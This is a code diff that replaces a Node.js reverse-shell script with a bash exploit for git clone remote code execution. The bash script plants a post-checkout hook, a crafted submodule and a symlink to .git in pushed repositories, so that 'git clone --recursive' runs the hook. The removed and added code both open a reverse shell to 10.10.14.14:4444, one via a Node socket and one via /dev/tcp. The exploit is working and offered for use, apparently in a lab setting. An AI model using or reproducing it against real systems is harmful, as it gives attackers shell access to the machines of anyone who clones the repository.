@@ -1,28 +1,99 @@
-const net = require("net");
-const { spawn } = require("child_process");
+#!/bin/bash
 
-const HOST = "10.10.14.14";  // Replace with your IP
-const PORT = 4444; // Replace with your listening port
+# Define repository paths
+HULK_REPO="git@github.com:safebuffer/hulk.git"
+pullme_REPO="git@github.com:safebuffer/submod.git"
 
-const client = new net.Socket();
-client.connect(PORT, HOST, () => {
-    const sh = spawn("/bin/sh", []);
-    client.write("Connected!\n");
+# Final Exploit Repo
+SMASH_REPO="git@github.com:safebuffer/smash.git"
 
-    client.on("data", (data) => {
-        sh.stdin.write(data);
-    });
+# Function to clone and set up the hook repository
+setup_HULK_REPO() {
+	# Remove existing directories
+	rm -rf hulk*
 
-    sh.stdout.on("data", (data) => {
-        client.write(data);
-    });
+	git clone "$HULK_REPO" hulk
 
-    sh.stderr.on("data", (data) => {
-        client.write(data);
-    });
+	# Navigate to the hook repository
+	cd hulk/ || exit
 
-    client.on("close", () => {
-        process.exit(0);
-    });
-});
+	# Create necessary directories and set up the post-checkout hook
+	mkdir -p y/hooks
+	# Add reverse shell payload as post-checkout hook
+	echo "bash -i >& /dev/tcp/10.10.14.14/4444 0>&1" > y/hooks/post-checkout
 
+	# Add and commit the post-checkout hook
+	git add y/hooks/post-checkout
+	git update-index --chmod=+x y/hooks/post-checkout
+	git commit -m "Add executable post-checkout hook"
+
+	# Push changes to the remote repository
+	git push
+
+	# Return to the parent directory
+	cd ..
+}
+
+# Function to clone and set up the pullme repository with a submodule
+setup_pullme_repo() {
+	# Remove existing directories
+	rm -rf pullme*
+
+	# Clone the pullme repository
+	git clone "$pullme_REPO" pullme
+
+	# Navigate to the pullme repository
+	cd pullme || exit
+
+	# Clean up previous directories and remove submodule
+	rm -rf a* A*
+	git rm -r A/modules/x
+
+	# Add the hook repository as a submodule
+	git submodule add --name x/y "$HULK_REPO" A/modules/x
+	git commit -m "Add submodule"
+
+	# Create a symlink to the .git directory
+	# Print the string ".git" to a file named dotgit.txt
+	printf .git > dotgit.txt
+
+	# Generate a hash for the contents of dotgit.txt and store it in dot-git.hash
+	# The `-w` option writes the object to the object database, and the hash is output
+	git hash-object -w --stdin < dotgit.txt > dot-git.hash
+
+	# Create an index info line for a symbolic link with the mode 120000
+	# The line is formatted as: "120000 <hash> 0\ta"
+	# 120000 indicates a symbolic link, <hash> is the content hash, and 'a' is the path in the index
+	printf "120000 %s 0\ta\n" "$(cat dot-git.hash)" > index.info
+
+	# Update the git index with the information from index.info
+	# This effectively stages the symbolic link for the next commit
+	git update-index --index-info < index.info
+
+	# Commit the staged changes with a message "Add symlink"
+	git commit -m "Add symlink"
+	# Push changes to the remote repository
+	git push
+
+	# Return to the parent directory
+	cd ..
+}
+
+# Function to clone the smash repository with submodules
+show_command() {
+  # Define color codes
+  RED='\033[0;31m'
+  GREEN='\033[0;32m'
+  YELLOW='\033[0;33m'
+  BLUE='\033[0;34m'
+  NC='\033[0m' # No Color
+
+  # Output the command with colors
+  echo -e "${GREEN}Trigger the exploit with ${NC}:\n"
+  echo -e "${YELLOW}git clone --recursive ${BLUE}$SMASH_REPO ${RED}GITRCE${NC}"
+}
+
+# Execute functions
+setup_HULK_REPO
+setup_pullme_repo
+show_command
